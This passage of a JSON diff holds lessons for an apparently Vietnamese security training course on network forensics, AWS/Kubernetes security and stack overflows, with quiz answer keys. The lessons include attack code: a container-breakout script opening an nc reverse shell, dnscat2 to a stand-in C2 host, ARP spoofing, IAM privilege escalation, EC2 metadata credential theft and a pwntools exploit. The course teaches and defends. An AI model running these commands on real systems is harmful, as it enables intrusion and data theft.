+        "theory": "Phân tích mạng là nền tảng của cả tấn công và phòng thủ. Nắm vững cấu trúc cờ TCP (SYN, ACK, FIN, RST, PSH, URG), cơ chế bắt tay 3 bước và cấu trúc frame Ethernet cho phép điều tra viên phân biệt đâu là lưu lượng hợp lệ và đâu là dấu hiệu của hành vi dò quét độc hại.",
+        "codeSnippet": "# Trích xuất các request HTTP GET chứa thông tin đăng nhập bằng tshark:\ntshark -r capture.pcap -Y \"http.request.method == 'POST'\" \\\n  -T fields -e ip.src -e ip.dst -e http.host -e http.file_data",
+        "codeLanguage": "bash",
+        "payloadExample": "tcpdump -i eth0 -nn -s0 -w incident_dump.pcap \"tcp port 80 or tcp port 443\"",
+        "secureSnippet": "# Phòng thủ bảo vệ hạ tầng mạng:\n# 1. Bật tính năng Port Security trên switch Cisco/Juniper\n# 2. Triển khai mã hóa toàn trình IPsec hoặc WireGuard cho mạng nội bộ",
+        "quiz": {
+          "question": "Bộ lọc Wireshark nào sau đây chỉ hiển thị các kết nối TCP mới bắt đầu (bắt tay 3 bước bước đầu tiên)?",
+          "options": [
+            "tcp.flags.syn == 1 and tcp.flags.ack == 0",
+            "tcp.flags.reset == 1",
+            "tcp.port == 80 and tcp.len > 0",
+            "ip.version == 4"
+          ],
+          "correct": 0,
+          "explanation": "Gói tin SYN đầu tiên trong quá trình bắt tay TCP có cờ SYN = 1 và ACK = 0, đánh dấu một yêu cầu thiết lập kết nối mới từ client đến server."
+        }
+      },
+      {
+        "id": "s2",
+        "title": "Điều Tra Luồng TCP/UDP & Nhận Diện Bất Thường Dò Quét Cổng (Port Scanning)",
+        "duration": "3h 15m",
+        "objective": "Phân biệt các kiểu quét nmap (SYN Scan, FIN Scan, Xmas Scan, Null Scan) qua dấu vết lưu lượng gói tin.",
+        "mitre": "T1046 - Dò quét dịch vụ mạng (Network Service Scanning)",
+        "cve": "Nmap Stealth Scan Signatures & Snort Rules",
+        "theory": "Các công cụ quét mạng như Nmap gửi các gói tin TCP với tổ hợp cờ bất thường để né tránh ghi log của hệ điều hành mục tiêu. Kỹ thuật Xmas Scan kích hoạt đồng thời các cờ FIN, PSH và URG, vi phạm RFC 793, khiến các máy chủ tuân thủ chuẩn TCP phải phản hồi cờ RST khi cổng đóng.",
+        "codeSnippet": "# Luật Snort phát hiện hành vi quét cổng Xmas Scan:\nalert tcp any any -> $HOME_NET any (msg:\"SCAN: Phát Hiện Kỹ Thuật Nmap Xmas Scan\"; \\\n  flags:FPU; classtype:attempted-recon; sid:1000001; rev:1;)",
+        "codeLanguage": "text",
+        "payloadExample": "nmap -sX -p 21,22,80,443 192.168.1.100",
+        "secureSnippet": "# Biện pháp ngăn chặn:\n# 1. Cấu hình Firewall drop các gói tin TCP có cờ bất thường\n# 2. Sử dụng Fail2ban chặn IP quét quá 20 cổng trong 5 giây",
+        "quiz": {
+          "question": "Kiểu quét cổng Nmap nào kích hoạt đồng thời 3 cờ FIN, PSH, và URG?",
+          "options": [
+            "TCP SYN Stealth Scan (-sS)",
+            "TCP Xmas Scan (-sX)",
+            "UDP Port Scan (-sU)",
+            "TCP Null Scan (-sN)"
+          ],
+          "correct": 1,
+          "explanation": "Xmas Scan được đặt tên vì gói tin 'sáng lên như cây thông Noel' với 3 cờ FIN, PSH, URG được bật cùng một lúc."
+        }
+      },
+      {
+        "id": "s3",
+        "title": "Tấn Công Đầu Độc Bảng ARP (ARP Spoofing) & Phân Tích Man-in-the-Middle TLS",
+        "duration": "3h 45m",
+        "objective": "Thực hiện tấn công đầu độc ARP trong mạng LAN chuyển mạch và phát hiện địa chỉ MAC trùng lặp trong gói tin Gratuitous ARP.",
+        "mitre": "T1557.002 - Đầu độc bảng ARP (ARP Poisoning)",
+        "cve": "CWE-300: Tấn công kẻ đứng giữa (Channel Accessible by Non-Endpoint)",
+        "theory": "Giao thức ARP hoạt động ở Tầng 2 (Data Link) không có cơ chế xác thực. Kẻ tấn công có thể liên tục gửi các gói tin ARP Reply giả mạo để lừa máy tính nạn nhân và Router rằng địa chỉ MAC của kẻ tấn công tương ứng với IP của đối phương, từ đó chuyển hướng toàn bộ lưu lượng qua máy của mình.",
+        "codeSnippet": "// Khởi động tấn công ARP Poisoning qua Ettercap hoặc Bettercap:\nbettercap -iface eth0 -eval \"net.probe on; set arp.spoof.targets 192.168.1.50; arp.spoof on\"",
+        "codeLanguage": "bash",
+        "payloadExample": "arpspoof -i eth0 -t 192.168.1.50 192.168.1.1",
+        "secureSnippet": "// Cấu hình tính năng Dynamic ARP Inspection (DAI) trên Switch:\nswitch(config)# ip dhcp snooping\nswitch(config)# ip dhcp snooping vlan 10\nswitch(config)# ip arp inspection vlan 10",
+        "quiz": {
+          "question": "Công nghệ switch mạng nào kiểm tra tính hợp lệ của gói tin ARP dựa trên bảng liên kết DHCP Snooping để chống lại ARP Poisoning?",
+          "options": [
+            "Spanning Tree Protocol (STP)",
+            "Dynamic ARP Inspection (DAI)",
+            "VLAN Trunking Protocol (VTP)",
+            "Link Aggregation (LACP)"
+          ],
+          "correct": 1,
+          "explanation": "Dynamic ARP Inspection (DAI) kiểm tra địa chỉ IP và MAC trong các gói ARP so với cơ sở dữ liệu DHCP Snooping hợp lệ, tự động loại bỏ các gói tin ARP giả mạo."
+        }
+      },
+      {
+        "id": "s4",
+        "title": "Phát Hiện Kênh Dữ Liệu Ngầm Qua Giao Thức DNS (DNS Tunneling Exfiltration)",
+        "duration": "3h 00m",
+        "objective": "Phát hiện mã độc đóng gói dữ liệu và trích xuất qua các truy vấn Subdomain DNS có entropy cao bằng Wireshark.",
+        "mitre": "T1071.004 - Kênh liên lạc qua DNS (DNS Data Exfiltration)",
+        "cve": "DNS Tunneling: Iodined / DNSCat2 Data Leaks",
+        "theory": "Vì hầu hết các mạng doanh nghiệp đều cho phép lưu lượng UDP port 53 đi qua firewall để phân giải tên miền, kẻ tấn công tận dụng DNS làm kênh truyền ngầm (Covert Channel). Dữ liệu nhạy cảm được mã hóa Base64/Hex và đính kèm vào tên subdomain (ví dụ: a8f9c1d0.data.c2server.com).",
+        "codeSnippet": "# Lệnh tshark phát hiện các truy vấn DNS có subdomain dài bất thường (> 50 ký tự):\ntshark -r traffic.pcap -Y \"dns.flags.response == 0 and dns.qry.name.len > 50\" \\\n  -T fields -e ip.src -e dns.qry.name",
+        "codeLanguage": "bash",
+        "payloadExample": "dnscat2 --dns domain=tunnel.attacker-c2.net",
+        "secureSnippet": "# Cấu hình DNS Sinkhole & Response Policy Zones (RPZ):\n# 1. Chặn truy vấn tới các tên miền mới đăng ký (< 30 ngày)\n# 2. Áp dụng giới hạn tần suất (Rate Limiting) và tính toán Shannon Entropy cho subdomain",
+        "quiz": {
+          "question": "Dấu hiệu thống kê nào là đặc trưng rõ nét nhất của hành vi rò rỉ dữ liệu qua DNS Tunneling?",
+          "options": [
+            "Lượng truy vấn kỷ lục tới các subdomain có độ dài lớn và độ hỗn loạn (Entropy) cao",
+            "Mọi truy vấn đều sử dụng giao thức TCP thay vì UDP",
+            "Máy trạm chỉ gửi request tới Google DNS 8.8.8.8",
+            "Tất cả các gói tin đều có kích thước chính xác 64 bytes"
+          ],
+          "correct": 0,
+          "explanation": "DNS Tunneling mã hóa dữ liệu thành chuỗi ký tự ngẫu nhiên trong subdomain, khiến độ dài query tăng cao và giá trị Shannon Entropy (độ hỗn loạn chuỗi) vượt xa tên miền thông thường."
+        }
+      },
+      {
+        "id": "s5",
+        "title": "Thực Hành Forensics PCAP: Trích Xuất Dữ Liệu Nhạy Cảm Bị Rò Rỉ",
+        "duration": "3h 30m",
+        "objective": "Điều tra file dump PCAP dung lượng lớn, tái cấu trúc tập tin truyền qua FTP/HTTP và tìm cờ Flag của cuộc tấn công.",
+        "mitre": "T1048 - Trích xuất dữ liệu qua giao thức thay thế",
+        "cve": "Network Forensic Investigation: Case Study Data Theft",
+        "theory": "Trong các cuộc điều tra số, kỹ sư giám định pháp y mạng (Network Forensic Investigator) phải phân tích file PCAP để dựng lại toàn bộ hành trình của kẻ tấn công: từ thời điểm ban đầu, file tải về máy nạn nhân, cho đến tài liệu bị đánh cắp trước khi firewall kịp cắt kết nối.",
+        "codeSnippet": "# Trích xuất tất cả tập tin truyền tải qua HTTP bằng công cụ NetworkMiner hoặc tshark:\ntshark -r investigation.pcap --export-objects http,./extracted_files/",
+        "codeLanguage": "bash",
+        "payloadExample": "foremost -i memory_network.pcap -o ./recovered_artifacts/",
+        "secureSnippet": "# Phòng vệ toàn diện:\n# 1. Triển khai TLS Inspection (SSL Decryption) trên Next-Gen Firewall\n# 2. Mã hóa toàn bộ dữ liệu khi truyền tải (Data in Transit)\n# 3. Sử dụng giải pháp DLP (Data Loss Prevention) giám sát lưu lượng ra ngoài",
+        "quiz": {
+          "question": "Công cụ phân tích mạng nào có khả năng tự động phân tách và trích xuất ảnh, tài liệu và chứng thư đăng nhập từ file PCAP mà không cần cấu hình phức tạp?",
+          "options": [
+            "NetworkMiner",
+            "Ping",
+            "Traceroute",
+            "Ntop"
+          ],
+          "correct": 0,
+          "explanation": "NetworkMiner là công cụ Network Forensic Analysis Tool (NFAT) chuyên dụng, tự động tái cấu trúc các tập tin (images, docs, credentials) được truyền qua các giao thức mạng không mã hóa."
+        }
+      }
+    ]
+  },
+  {
+    "id": "mod-cld401",
+    "code": "CLD-401",
+    "category": "cloud",
+    "track": "Cloud & DevSecOps / Bảo Mật Đám Mây & Kubernetes",
+    "title": "Bảo Mật Hạ Tầng Điện Toán Đám Mây & Leo Thang Đặc Quyền AWS IAM",
+    "difficulty": "Chuyên Gia",
+    "difficultyKey": "specialist",
+    "duration": "22 Giờ Học",
+    "lessonsCount": 6,
+    "labsCount": 5,
+    "enrolledCount": "2,310",
+    "mitre": "T1078.004 / T1548",
+    "cert": "AWS Certified Security / CKS",
+    "cvssBase": "9.6 CRITICAL",
+    "threatProfile": "Đánh Cắp Danh Tính Cloud & Thoát Khỏi Container (Container Escape)",
+    "description": "Khám phá các cấu hình sai phổ biến trên AWS, Azure và Kubernetes. Khai thác quyền PassRole, chiếm quyền root tổ chức qua IAM, audit S3 Bucket và kỹ thuật container escape phá vỡ cách ly nhân Linux.",
+    "labLink": "/labs",
+    "labId": "lab-04",
+    "syllabus": [
+      {
+        "id": "s1",
+        "title": "Mô Hình Trách Nhiệm Chung & Logic Đánh Giá Quyền Hạn Trong AWS IAM",
+        "duration": "3h 00m",
+        "objective": "Làm chủ logic đánh giá IAM Policy (Explicit Deny, SCP, Permission Boundary và Resource Policy).",
+        "mitre": "T1078.004 - Chiếm dụng tài khoản Cloud",
+        "cve": "AWS IAM Policy Evaluation Logic & Misconfiguration",
+        "theory": "Trong AWS, quyền hạn được đánh giá theo thứ tự nghiêm ngặt. Nếu có bất kỳ chính sách nào chứa 'Deny' rõ ràng (Explicit Deny), quyền truy cập sẽ bị từ chối lập tức bất kể có bao nhiêu chính sách 'Allow' khác. Thiếu hiểu biết về Permission Boundary có thể tạo ra kẽ hở cho phép tài khoản phụ tự cấp quyền Administrator.",
+        "codeSnippet": "// IAM Policy cấu hình lỏng lẻo nguy hiểm:\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Action\": \"iam:*\",\n      \"Resource\": \"*\"\n    }\n  ]\n}",
+        "codeLanguage": "json",
+        "payloadExample": "aws iam list-attached-user-policies --user-name target-contractor",
+        "secureSnippet": "// Bản vá an toàn: Áp dụng nguyên tắc đặc quyền tối thiểu (Least Privilege)\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Action\": [\"s3:GetObject\"],\n      \"Resource\": \"arn:aws:s3:::company-public-assets/*\"\n    }\n  ]\n}",
+        "quiz": {
+          "question": "Trong quy trình đánh giá quyền hạn của AWS IAM, yếu tố nào luôn có quyền ưu tiên tuyệt đối cao nhất?",
+          "options": [
+            "Chính sách Explicit Deny",
+            "Chính sách AdministratorAccess",
+            "Chính sách Service Control Policy (SCP)",
+            "Chính sách Inline Allow"
+          ],
+          "correct": 0,
+          "explanation": "Trong AWS IAM, một phát biểu Explicit Deny luôn ghi đè và vô hiệu hóa mọi phát biểu Allow, không có bất kỳ ngoại lệ nào."
+        }
+      },
+      {
+        "id": "s2",
+        "title": "21 Kịch Bản Khai Thác Leo Thang Đặc Quyền AWS IAM (IAM Privilege Escalation Vectors)",
+        "duration": "4h 30m",
+        "objective": "Khai thác các quyền CreatePolicyVersion, SetDefaultPolicyVersion và PassRole để đạt quyền AdministratorAccess.",
+        "mitre": "T1548 - Lạm dụng cơ chế leo thang đặc quyền",
+        "cve": "Rhino Security Labs: 21 AWS IAM Privilege Escalation Vectors",
+        "theory": "Nếu một tài khoản người dùng chỉ có quyền iam:CreatePolicyVersion, họ có thể tạo phiên bản mới cho chính sách hiện tại với quyền Administrator ('Action': '*') và đặt làm mặc định, từ đó biến tài khoản quyền thấp thành Super Admin của toàn bộ AWS Account.",
+        "codeSnippet": "# Khai thác quyền CreatePolicyVersion qua AWS CLI:\naws iam create-policy-version \\\n  --policy-arn arn:aws:iam::123456789012:policy/TargetPolicy \\\n  --policy-document file://admin-policy.json \\\n  --set-as-default",
+        "codeLanguage": "bash",
+        "payloadExample": "aws iam attach-user-policy --user-name my-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
+        "secureSnippet": "# Phòng vệ IAM:\n# 1. Đặt IAM Permissions Boundary ngăn người dùng tự nâng quyền\n# 2. Sử dụng AWS IAM Access Analyzer rà soát các chính sách dư thừa quyền",
+        "quiz": {
+          "question": "Quyền IAM nào cho phép kẻ tấn công gán một IAM Role có đặc quyền quản trị viên cho một máy ảo EC2 mới tạo?",
+          "options": [
+            "iam:PassRole",
+            "iam:ListUsers",
+            "ec2:DescribeInstances",
+            "s3:ListAllMyBuckets"
+          ],
+          "correct": 0,
+          "explanation": "iam:PassRole cho phép truyền một IAM role sang dịch vụ AWS (như EC2 hoặc Lambda). Kẻ tấn công có thể khởi chạy EC2 với Admin role và trích xuất credentials từ đó."
+        }
+      },
+      {
+        "id": "s3",
+        "title": "Kiểm Toán An Toàn S3 Bucket, Cấu Hình ACL & Mã Hóa Dữ Liệu SSE-KMS",
+        "duration": "3h 15m",
+        "objective": "Dò quét các S3 Bucket không xác thực, phân tích Bucket Policies và cấu hình mã hóa khóa quản lý riêng qua AWS KMS.",
+        "mitre": "T1530 - Đánh cắp dữ liệu từ Cloud Storage",
+        "cve": "CWE-284: Kiểm Soát Truy Cập S3 Bị Lỏng Lẻo (Public S3 Leaks)",
+        "theory": "Rò rỉ dữ liệu S3 là nguyên nhân của hàng trăm vụ vi phạm dữ liệu lớn nhất thế giới. Kẻ tấn công sử dụng các công cụ như S3Scanner để phát hiện các bucket mở quyền truy cập 'AllUsers' hoặc 'AuthenticatedUsers' (nhóm này bao gồm bất kỳ ai có tài khoản AWS bất kỳ trên toàn cầu).",
+        "codeSnippet": "// S3 Bucket Policy mở quyền đọc công khai nguy hiểm:\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Sid\": \"PublicReadGetObject\",\n      \"Effect\": \"Allow\",\n      \"Principal\": \"*\",\n      \"Action\": \"s3:GetObject\",\n      \"Resource\": \"arn:aws:s3:::customer-pii-backup/*\"\n    }\n  ]\n}",
+        "codeLanguage": "json",
+        "payloadExample": "aws s3 sync s3://company-confidential-backups/ ./stolen_data/ --no-sign-request",
+        "secureSnippet": "// Bật tính năng S3 Block Public Access toàn cục:\naws s3api put-public-access-block \\\n  --bucket target-bucket \\\n  --public-access-block-configuration \"BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true\"",
+        "quiz": {
+          "question": "Trong cấu hình phân quyền AWS S3, nhóm đối tượng 'AuthenticatedUsers' đại diện cho ai?",
+          "options": [
+            "Chỉ các nhân viên nội bộ trong cùng tài khoản AWS của công ty",
+            "Bất kỳ người dùng nào có tài khoản AWS hợp lệ trên toàn thế giới",
+            "Chỉ các quản trị viên đã cấu hình MFA",
+            "Khách truy cập đã đăng nhập tài khoản Google"
+          ],
+          "correct": 1,
+          "explanation": "Một sai lầm kinh điển: 'AuthenticatedUsers' bao gồm BẤT KỲ AI có tài khoản AWS nào trên toàn cầu, không hề giới hạn trong tổ chức của bạn."
+        }
+      },
+      {
+        "id": "s4",
+        "title": "Tăng Cường Bảo Mật Cụm Kubernetes: Cấu Hình RBAC & Pod Security Standards",
+        "duration": "4h 00m",
+        "objective": "Cấu hình vai trò Kubernetes RBAC, audit security context của container đặc quyền và áp dụng Kyverno admission controller.",
+        "mitre": "T1611 - Thoát khỏi Container sang Host Node",
+        "cve": "CIS Kubernetes Benchmark v1.8 & Pod Security Standards",
+        "theory": "Kubernetes điều khiển hàng ngàn container trong môi trường cloud-native. Cấu hình lỏng lẻo như cho phép pod chạy dưới dạng 'privileged: true' hay mount thư mục '/var/run/docker.sock' của host node sẽ biến một lỗi web đơn giản thành thảm họa chiếm toàn bộ cụm máy chủ.",
+        "codeSnippet": "# Pod Spec cấu hình sai cực kỳ nguy hiểm (Cho phép thoát container):\napiVersion: v1\nkind: Pod\nmetadata:\n  name: vulnerable-pod\nspec:\n  containers:\n  - name: app\n    image: nginx\n    securityContext:\n      privileged: true # Cấp toàn quyền truy cập nhân Linux của Host\n    volumeMounts:\n    - mountPath: /host\n      name: host-volume\n  volumes:\n  - name: host-volume\n    hostPath:\n      path: /",
+        "codeLanguage": "yaml",
+        "payloadExample": "kubectl auth can-i create pods --as=system:serviceaccount:default:web-sa",
+        "secureSnippet": "# Cấu hình Pod Security Standard chế độ Restricted:\napiVersion: v1\nkind: Namespace\nmetadata:\n  name: secure-apps\n  labels:\n    pod-security.kubernetes.io/enforce: restricted\n    pod-security.kubernetes.io/audit: restricted",
+        "quiz": {
+          "question": "Rủi ro an ninh nghiêm trọng nhất khi mount tập tin '/var/run/docker.sock' của host vào bên trong một Pod là gì?",
+          "options": [
+            "Pod sẽ tiêu tốn gấp đôi dung lượng RAM",
+            "Container có thể giao tiếp trực tiếp với Docker Daemon của host để tạo container mới quyền root chiếm quyền máy chủ vật lý",
+            "Thời gian tải ảnh Docker bị chậm đi 30%",
+            "Tập tin log của Kubernetes bị xóa tự động"
+          ],
+          "correct": 1,
+          "explanation": "Truy cập vào Docker socket tương đương với việc cấp quyền root trên host machine, vì người bên trong pod có thể ra lệnh cho Docker daemon tạo container đặc quyền gắn ổ cứng host."
+        }
+      },
+      {
+        "id": "s5",
+        "title": "Kỹ Thuật Thoát Khỏi Container: Khai Thác Privileged Pods & Docker Socket",
+        "duration": "3h 45m",
+        "objective": "Thực hiện tấn công phá vỡ cách ly namespace và cgroups của Linux kernel để chiếm shell root trên máy chủ vật lý.",
+        "mitre": "T1611 - Phá vỡ cách ly container (Container Escape)",
+        "cve": "CVE-2022-0492: Linux Kernel cgroups Container Breakout",
+        "theory": "Container không phải là máy ảo. Chúng sử dụng chung nhân Linux (Kernel) với máy chủ vật lý và chỉ được cách ly bởi Linux Namespaces (PID, Mount, Net) và cgroups. Khi container có cờ SYS_ADMIN hoặc Privileged, kẻ tấn công có thể mount lại ổ đĩa máy chủ (host disk) hoặc lạm dụng tính năng release_agent của cgroups để thực thi mã ngoài host.",
+        "codeSnippet": "#!/bin/sh\n# Kỹ thuật cgroups release_agent container breakout:\nmkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp\nmkdir /tmp/cgrp/x\necho 1 > /tmp/cgrp/x/notify_on_release\nhost_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`\necho \"$host_path/cmd\" > /tmp/cgrp/release_agent\necho '#!/bin/sh' > /cmd\necho \"nc 10.10.14.89 4444 -e /bin/sh\" >> /cmd\nchmod a+x /cmd\nsh -c \"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs\"",
+        "codeLanguage": "bash",
+        "payloadExample": "chroot /host /bin/bash",
+        "secureSnippet": "# Biện pháp phòng chống:\n# 1. Không bao giờ chạy container với cờ --privileged\n# 2. Sử dụng gVisor hoặc Kata Containers để cách ly kernel riêng biệt\n# 3. Kích hoạt AppArmor / SELinux profile nghiêm ngặt",
+        "quiz": {
+          "question": "Tính năng cốt lõi nào của nhân Linux chịu trách nhiệm phân tách và cô lập ranh giới tiến trình (PID, Network, Mount) giữa container và host?",
+          "options": [
+            "Linux Namespaces",
+            "Swap Partition",
+            "CRON Scheduler",
+            "Initramfs"
+          ],
+          "correct": 0,
+          "explanation": "Linux Namespaces (PID, Mount, Network, IPC, UTS, User) là cơ chế nền tảng tạo ra sự cô lập giữa tiến trình bên trong container và hệ điều hành host."
+        }
+      },
+      {
+        "id": "s6",
+        "title": "Thao Trường Cloud Capstone: Tấn Công Xâm Nhập Ngang Từ EC2 Lên AWS Org Root",
+        "duration": "3h 30m",
+        "objective": "Kết hợp lỗ hổng SSRF trên EC2, trích xuất token role, pivot sang DynamoDB và chiếm đoạt tài khoản Root của tổ chức.",
+        "mitre": "T1078.004 & T1538 - Xâm nhập ngang hạ tầng Cloud",
+        "cve": "Cloud Attack Chain: SSRF to IAM Full Admin Takeover",
+        "theory": "Trong các sự cố thực tế như vụ rò rỉ dữ liệu của Capital One, cuộc tấn công bắt đầu từ một lỗi SSRF trên máy chủ web WAF. Kẻ tấn công lấy được IAM temporary credentials, sau đó sử dụng các credentials này để liệt kê và tải về hàng trăm bucket S3 nhạy cảm của doanh nghiệp.",
+        "codeSnippet": "// Trích xuất IAM temporary keys từ EC2 Metadata:\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/AppRole\n// Cấu hình vào AWS CLI cục bộ của hacker:\nexport AWS_ACCESS_KEY_ID=\"AKIA...\"\nexport AWS_SECRET_ACCESS_KEY=\"...\"\nexport AWS_SESSION_TOKEN=\"...\"",
+        "codeLanguage": "bash",
+        "payloadExample": "aws sts get-caller-identity",
+        "secureSnippet": "# Phòng thủ toàn diện cho Cloud:\n# 1. Bật AWS GuardDuty phát hiện hành vi sử dụng credentials ngoài VPC\n# 2. Bắt buộc IMDSv2 với Hop-Limit = 1\n# 3. Áp dụng SCP (Service Control Policies) giới hạn các hành động nguy hiểm",
+        "quiz": {
+          "question": "Dịch vụ nào của AWS ghi lại toàn bộ lịch sử các lệnh API được gọi trong toàn bộ AWS Organization để phục vụ điều tra forensics?",
+          "options": [
+            "AWS CloudTrail",
+            "Amazon Route 53",
+            "Amazon ElastiCache",
+            "AWS Elastic Beanstalk"
+          ],
+          "correct": 0,
+          "explanation": "AWS CloudTrail là dịch vụ cốt lõi ghi nhận mọi API call (ai gọi, từ IP nào, thời gian nào, tham số gì) trong toàn bộ tài khoản AWS phục vụ việc kiểm toán an ninh."
+        }
+      }
+    ]
+  },
+  {
+    "id": "mod-rev501",
+    "code": "REV-501",
+    "category": "reverse",
+    "track": "Binary Exploitation / Khai Thác Nhị Phân & Dịch Ngược",
+    "title": "Khai Thác Nhị Phân, Tràn Bộ Đệm Stack x86_64 & Dịch Ngược Ghidra",
+    "difficulty": "Chuyên Gia",
+    "difficultyKey": "specialist",
+    "duration": "26 Giờ Học",
+    "lessonsCount": 6,
+    "labsCount": 5,
+    "enrolledCount": "1,870",
+    "mitre": "T1203 / T1059",
+    "cert": "OSCE / eCRE",
+    "cvssBase": "9.8 CRITICAL",
+    "threatProfile": "Lỗi Tràn Bộ Nhớ & Chế Tạo Shellcode Thực Thi Mã Từ Xa",
+    "description": "Đào sâu vào thanh ghi CPU x86_64, cấu trúc ngăn xếp stack frame và lỗi tham chiếu con trỏ bộ nhớ. Dịch ngược file thực thi ELF/PE trong Ghidra, viết shellcode tùy biến và bypass các cơ chế bảo vệ ASLR, DEP/NX, Stack Canaries.",
+    "labLink": "/labs",
+    "labId": "lab-05",
+    "syllabus": [
+      {
+        "id": "s1",
+        "title": "Kiến Trúc Bộ Vi Xử Lý x86_64, Thanh Ghi & Quy Ước Gọi Hàm (Calling Conventions)",
+        "duration": "3h 30m",
+        "objective": "Nắm vững các thanh ghi RAX, RBX, RDI, RSI, RBP, RSP và quy ước gọi hàm System V AMD64 ABI.",
+        "mitre": "T1203 - Khai thác thực thi mã cấp client",
+        "cve": "x86_64 Architecture & Stack Frame Mechanics",
+        "theory": "Trong kiến trúc x86_64 trên Linux, 6 tham số nguyên đầu tiên truyền vào một hàm được lưu trong các thanh ghi theo thứ tự: RDI, RSI, RDX, RCX, R8, R9. Thanh ghi RSP trỏ tới đỉnh của ngăn xếp (Stack Top), còn RBP đóng vai trò là con trỏ cơ sở (Base Pointer) định vị biến cục bộ.",
+        "codeSnippet": "// Minh họa hợp ngữ Assembly x86_64 gọi hàm:\nmov rdi, message_ptr   ; Tham số 1: con trỏ chuỗi\nmov rsi, 42            ; Tham số 2: số nguyên\ncall vulnerable_func   ; Gọi hàm và đẩy Return Address (RIP) vào Stack",
+        "codeLanguage": "assembly",
+        "payloadExample": "gdb -q ./vulnerable_binary -ex \"disassemble main\"",
+        "secureSnippet": "// Quy tắc lập trình an toàn:\n// 1. Biên dịch với cờ -Wall -Wextra -Werror\n// 2. Sử dụng các ngôn ngữ an toàn bộ nhớ (Rust, Go) thay cho C/C++ thuần",
+        "quiz": {
+          "question": "Trong quy ước gọi hàm System V AMD64 ABI của Linux x86_64, thanh ghi nào chứa tham số đầu tiên được truyền vào một hàm?",
+          "options": [
+            "RDI",
+            "RAX",
+            "RSP",
+            "RBX"
+          ],
+          "correct": 0,
+          "explanation": "Theo chuẩn System V ABI trên Linux 64-bit, tham số đầu tiên luôn được truyền qua thanh ghi RDI, tiếp theo là RSI, RDX, RCX, R8 và R9."
+        }
+      },
+      {
+        "id": "s2",
+        "title": "Làm Chủ Trình Dịch Ngược NSA Ghidra & Phân Tích Tĩnh Cấu Trúc Nhị Phân",
+        "duration": "4h 00m",
+        "objective": "Dịch ngược file ELF stripped và file PE trong công cụ Ghidra của NSA, khôi phục tên hàm và cấu trúc dữ liệu bị che giấu.",
+        "mitre": "T1027 - Che giấu tập tin và thông tin mã độc",
+        "cve": "Reverse Engineering: Phân Tích Mã Độc Nhị Phân",
+        "theory": "Ghidra là bộ công cụ dịch ngược (Software Reverse Engineering) mã nguồn mở do NSA phát triển. Decompiler của Ghidra có khả năng chuyển đổi trực tiếp mã máy x86/ARM/MIPS sang mã giả C (Decompiled C Code), giúp chuyên gia nhận diện các hàm sao chép chuỗi không an toàn như strcpy, gets, sprintf.",
+        "codeSnippet": "// Mã C dễ tổn thương sau khi dịch ngược qua Ghidra:\nvoid check_license(void) {\n  char user_key[64];\n  puts(\"Nhập License Key:\");\n  gets(user_key); // LỖ HỔNG: gets() không giới hạn số lượng byte đọc vào buffer!\n  if (strcmp(user_key, \"SUPER_SECRET\") == 0) {\n    grant_access();\n  }\n}",
+        "codeLanguage": "c",
+        "payloadExample": "python3 -c \"import pwn; r = pwn.process('./binary'); r.sendline(pwn.cyclic(120))\"",
+        "secureSnippet": "// Bản vá an toàn trong C: Sử dụng fgets với giới hạn kích thước buffer\nvoid check_license_safe(void) {\n  char user_key[64];\n  puts(\"Nhập License Key:\");\n  if (fgets(user_key, sizeof(user_key), stdin) != NULL) {\n    user_key[strcspn(user_key, \"\\n\")] = 0; // Xóa ký tự newline\n    if (strcmp(user_key, \"SUPER_SECRET\") == 0) {\n      grant_access();\n    }\n  }\n}",
+        "quiz": {
+          "question": "Trong ngôn ngữ C, hàm xử lý chuỗi nào bị coi là cực kỳ nguy hiểm và bị cấm sử dụng vì hoàn toàn không kiểm tra độ dài buffer đích?",
+          "options": [
+            "gets()",
+            "fgets()",
+            "snprintf()",
+            "strncat()"
+          ],
+          "correct": 0,
+          "explanation": "Hàm gets() đọc ký tự từ stdin cho đến khi gặp ký tự xuống dòng mà không quan tâm kích thước buffer, là thủ phạm gây ra vô số lỗi tràn bộ đệm stack trong lịch sử."
+        }
+      },
+      {
+        "id": "s3",
+        "title": "Khai Thác Lỗi Tràn Bộ Đệm Ngăn Xếp (Stack-Based Buffer Overflow) & Chiếm Quyền RIP",
+        "duration": "4h 30m",
+        "objective": "Tính toán khoảng cách padding bằng chuỗi de Bruijn cyclic pattern và ghi đè con trỏ địa chỉ trở về (Saved Return Pointer - RIP).",
+        "mitre": "T1203 - Làm hỏng bộ nhớ ngăn xếp (Stack Corruption)",
+        "cve": "CWE-121: Tràn Bộ Đệm Ngăn Xếp (Stack-based Buffer Overflow)",
+        "theory": "Khi dữ liệu ghi vào một mảng cục bộ trên stack vượt quá kích thước được cấp phát, nó sẽ ghi đè lên các biến lân cận, frame pointer (RBP) và cuối cùng là Saved RIP. Khi hàm kết thúc và thực hiện lệnh 'ret', CPU sẽ nạp giá trị bị ghi đè vào thanh ghi con trỏ lệnh RIP, chuyển hướng luồng thực thi sang payload của kẻ tấn công.",
+        "codeSnippet": "// Đoạn mã Python exploit tràn bộ đệm bằng pwntools:\nfrom pwn import *\ntarget = process('./vuln_app')\noffset = 72 # Tính toán qua cyclic pattern\npayload = b\"A\" * offset + p64(0x0000000000401156) # Địa chỉ hàm win()\ntarget.sendline(payload)\ntarget.interactive()",
+        "codeLanguage": "python",
+        "payloadExample": "python3 -c \"print('A'*72 + 'V\u0011@\u0000\u0000\u0000\u0000\u0000')\" | ./vuln_app",
+        "secureSnippet": "// Biên dịch với cờ bảo vệ Stack Canary của GCC:\n// gcc -fstack-protector-all -Wformat -Wformat-security -o secure_app vuln.c",
+        "quiz": {
+          "question": "Cơ chế an ninh nào chèn một giá trị ngẫu nhiên (Canary) ngay trước Saved Return Pointer trên stack để phát hiện hành vi ghi đè bộ nhớ trước khi hàm trả về?",
+          "options": [
+            "Stack Canary (Stack Guard)",
